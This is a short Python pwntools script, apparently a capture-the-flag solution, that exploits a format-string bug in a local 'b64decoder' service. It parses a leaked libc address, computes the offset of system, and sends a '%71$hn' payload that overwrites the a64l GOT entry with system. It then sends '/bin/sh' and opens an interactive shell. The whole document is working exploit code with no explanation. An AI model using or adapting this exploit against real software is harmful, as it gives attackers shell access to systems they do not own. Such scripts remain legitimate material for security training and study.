from pwn import *


p = remote('localhost', 2783)
binary = ELF("./b64decoder")
libc = ELF("./libc.so.6")
print(p.recvline())
# print(p.recvline())
print(p.recvline())

a64_addr = int(str(p.recvline()).split("(")[1].split(")")[0],16)

system_lower = (a64_addr - (libc.symbols.a64l - libc.symbols.system)) & 0xFFFF
payload = bytearray()
payload += p32(binary.got['a64l'])
payload += "%{}x".format(str(system_lower-4)).encode('ascii')
payload += "%71$hn".encode('ascii')

p.sendline(payload)
p.sendline("/bin/sh")
p.interactive()
